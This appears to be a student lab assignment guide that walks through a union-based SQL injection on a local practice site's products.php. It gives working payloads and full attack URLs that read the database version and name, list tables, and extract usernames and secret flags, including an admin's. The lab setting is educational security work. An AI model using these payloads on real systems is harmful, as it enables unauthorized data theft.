# Task B: Union-Based Data Exfiltration Attack Guide

## 🎯 **Objective:**
Extract system information (MySQL version and database name) through Union-based SQL injection on products.php

## 🔍 **Target Analysis:**
- **File:** `products.php`
- **Vulnerable Query:** `SELECT name, price FROM products WHERE product_id = '$product_id'`
- **Columns:** 2 (name, price)
- **Attack Vector:** GET parameter `id`

## 🔐 **Attack Strategy:**

### **Step 1: Test Normal Functionality**
First, verify the application works normally:
```
http://localhost/sqli_lab/products.php?id=101
```
**Expected:** Shows "Secure Firewall" product with price $999.00

### **Step 2: Discover Column Count**
The query selects 2 columns (name, price), so our UNION must also select 2 columns.

### **Step 3: Craft Union-Based Payload**

**Base URL:**
```
http://localhost/sqli_lab/products.php?id=
```

**Payload:**
```
-1' UNION SELECT VERSION(), DATABASE() --
```

**Complete Attack URL:**
```
http://localhost/sqli_lab/products.php?id=-1' UNION SELECT VERSION(), DATABASE() --
```

## 🛠️ **How the Attack Works:**

### **Original Query:**
```sql
SELECT name, price FROM products WHERE product_id = '$product_id'
```

### **After Injection:**
```sql
SELECT name, price FROM products WHERE product_id = '-1' UNION SELECT VERSION(), DATABASE() --'
```

### **Explanation:**
1. **`-1'`** - Invalid product ID ensures no legitimate results
2. **`UNION SELECT`** - Combines results from our malicious query
3. **`VERSION()`** - Returns MySQL version (Column 1 - name)
4. **`DATABASE()`** - Returns current database name (Column 2 - price)
5. **`--`** - Comments out the rest of the query

## 📋 **Step-by-Step Execution:**

### **Step 1: Test Basic Functionality**
1. Open browser
2. Navigate to: `http://localhost/sqli_lab/products.php?id=101`
3. Verify you see the Secure Firewall product

### **Step 2: Execute Union Attack**
1. **Copy this complete URL:**
   ```
   http://localhost/sqli_lab/products.php?id=-1' UNION SELECT VERSION(), DATABASE() --
   ```

2. **Paste it in your browser address bar**
3. **Press Enter**

### **Step 3: Analyze Results**
You should see a table with:
- **Column 1 (Product Name):** MySQL version (e.g., "10.4.32-MariaDB")
- **Column 2 (Price):** Database name (e.g., "assignment_db")

## 🎯 **Expected Results:**

### **Successful Attack Display:**
```
Product Lookup Table:
┌─────────────────────────────┬─────────────────┐
│ Column 1 (Product Name)     │ Column 2 (Price)│
├─────────────────────────────┼─────────────────┤
│ 10.4.32-MariaDB            │ assignment_db   │
└─────────────────────────────┴─────────────────┘
```

## 📸 **Deliverable 2.B Requirements:**

### **1. Final Payload:**
```
-1' UNION SELECT VERSION(), DATABASE() --
```

### **2. Complete Attack URL:**
```
http://localhost/sqli_lab/products.php?id=-1' UNION SELECT VERSION(), DATABASE() --
```

### **3. Screenshot Requirements:**
Take a screenshot showing:
- ✅ The complete URL in the address bar
- ✅ The products.php table displaying system information
- ✅ MySQL version in Column 1
- ✅ Database name (assignment_db) in Column 2

## 🔍 **Alternative Payloads to Try:**

### **Extract Table Names:**
```
http://localhost/sqli_lab/products.php?id=-1' UNION SELECT table_name, 'table_info' FROM information_schema.tables WHERE table_schema='assignment_db' --
```

### **Extract User Data:**
```
http://localhost/sqli_lab/products.php?id=-1' UNION SELECT username, secret_flag FROM users --
```

### **Extract Admin Flag:**
```
http://localhost/sqli_lab/products.php?id=-1' UNION SELECT username, secret_flag FROM users WHERE role='admin' --
```

## ⚠️ **Troubleshooting:**

### **If No Results Appear:**
- Check that XAMPP Apache/MySQL are running
- Verify the database was set up correctly
- Try URL encoding special characters

### **If Query Fails:**
- Check for syntax errors in the payload
- Ensure the UNION selects the same number of columns (2)
- Verify the database name is correct

## 🚀 **Ready to Attack!**

**Copy and paste this URL into your browser:**
```
http://localhost/sqli_lab/products.php?id=-1' UNION SELECT VERSION(), DATABASE() --
```

**Take a screenshot when successful and document your findings!**